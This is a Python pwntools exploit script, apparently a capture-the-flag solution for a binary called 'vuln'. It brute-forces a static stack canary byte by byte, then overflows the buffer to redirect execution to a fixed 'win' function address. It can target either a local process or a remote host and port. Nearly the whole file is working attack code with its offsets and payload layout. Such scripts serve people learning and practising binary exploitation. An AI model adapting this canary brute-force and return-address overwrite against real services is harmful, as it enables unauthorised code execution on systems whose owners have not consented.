#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

log.info("""since the canary is static across every run, we can brute force it 1 byte at a time.
64 bytes + <brute force char> => crash is not the right byte, exit normally signals correct byte
64 bytes + char1 + brute force char 2 etc etc until we have all 4

         then ret2win. no PIE""")

CANARY_SIZE = 4
canary = b''

CANARY_DIST = 64
EIP_FROM_CANARY = 16
WIN = p32(0x08049336)

p = log.progress("Brute forcing canary...")
while len(canary) != CANARY_SIZE:
    for x in range(0x100):
        attempt = canary + bytes([x])
        p.status(attempt)
        io = start(level='error')
        io.sendline(b"%d" % (CANARY_DIST + len(attempt)))
        io.sendline(b'A' * CANARY_DIST + attempt)
        output = io.recvall()
        io.close()
        if b"Ok... Now Where's the Flag?" in output:
            canary = attempt
            break

p.success(f"canary found = {canary}")

log.info("triggering ret2win...")
io = start()

#io.sendline(b"%d" % (CANARY_DIST + CANARY_SIZE + EIP_FROM_CANARY + 4))
io.sendline(b"256")
#pause()
io.send(cyclic(CANARY_DIST) + canary + cyclic(EIP_FROM_CANARY) + WIN)

io.interactive()

